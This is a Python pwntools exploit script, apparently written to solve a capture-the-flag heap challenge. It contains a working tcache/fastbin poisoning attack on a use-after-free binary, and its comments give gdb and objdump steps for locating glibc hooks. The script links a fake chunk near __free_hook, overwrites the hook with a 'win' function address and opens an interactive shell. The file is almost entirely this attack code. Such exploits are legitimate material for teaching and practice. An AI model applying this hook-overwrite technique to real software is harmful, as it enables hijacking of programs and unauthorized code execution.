#!/usr/bin/env python3
# -- coding: utf-8 --
# This exploit template was generated via:
# $ pwn template ./use_after_free --host 107.21.135.41 --port 15555
from pwn import *

# Set up pwntools for the correct architecture
#exe = context.binary = ELF('use_after_free')
#libc = ELF("libc.so.6")
# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141


#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x3ff000)
# RUNPATH:  b'.'


# libc_base_remote = 0x7ffff79e4000
# objdump -T ./libc.so.6 | grep __malloc_hook

# objdump -T ./libc.so.6 | grep __free_hook
# objdump -T ./libc.so.6 | grep __realloc_hook

# libc_base + __malloc_hook = mallock_hook address
# x malloc_hook_addr at gdb to check it is a real malloc hook
# bins at gdb
# set *(long *)0x405330 = malloc_hook_addr-0x10  at gdb
# the above line is for p64(malloc_hook_addr - 10)
# malloc many to get the address
# use __free_hook

libc_base = 0x7ffff79e4000
#free_hook = 0x3ed8e8
# free_hook = libc_base+free_hook
#free_hook = 0x7ffff7dd18e8

END_OF_MENU =b"e.g, l\n"

def malloc(p):
    p.sendline(b"m 8")
    print("m 8")
    print(p.recvuntil(END_OF_MENU).decode())

def free(p, index):
    p.sendline(b"f %d" % index)
    print(f"free")
    print(p.recvuntil(END_OF_MENU).decode())

def edit(p, index, content):
    p.sendline(b"e %d %b" % (index, content))
    print(b"e %d %b" % (index, content))
    print(p.recvuntil(END_OF_MENU).decode())

def exit(p):
    p.sendline(b"0")



def launch_attack(p):
    p.recvuntil(END_OF_MENU.decode())
    # 0. Prepare for tcahce bin and fastbin
    # The number of allocated chunks is greater than 7
    for _ in range(10):
        malloc(p) # index : 0 to 9
    
    for i in range(10):
        free(p, i)

    # 1. Identify a fake chunk
    #victim_memory = libc_base + exe.libc.symbols["__malloc_hook"]
    victim_memory = libc_base + 0x3ed8e8 #exe.libc.symbols["__free_hook"]
    fake_chunk_addr = victim_memory - 0x10
    print("fake_chunk_addr", hex(fake_chunk_addr)) 
    # 2. Link the fake chunk to fastbin freelist
    # tcahe = start of victim_memory, fastbin = victim - 0x10
    edit(p, 9, p64(fake_chunk_addr))

    # 3. Emptify tcahce bin
    for _ in range(7):
        malloc(p) # index: 10 to 16

    # 4. Tcache refill (reversely)
    malloc(p) # index : 17

    # 5. Malloc to get fake chunk
    malloc(p) # index : 18

    # 6. Overwrite victim memory
    # 0x401948 is win function address
    edit(p, 18, p64(0x401948)) 
    p.send(b"f")    
    # 7. Trigger the vulnerability by calling the victim pointer
    p.interactive()



io = process('./use_after_free')

launch_attack(io)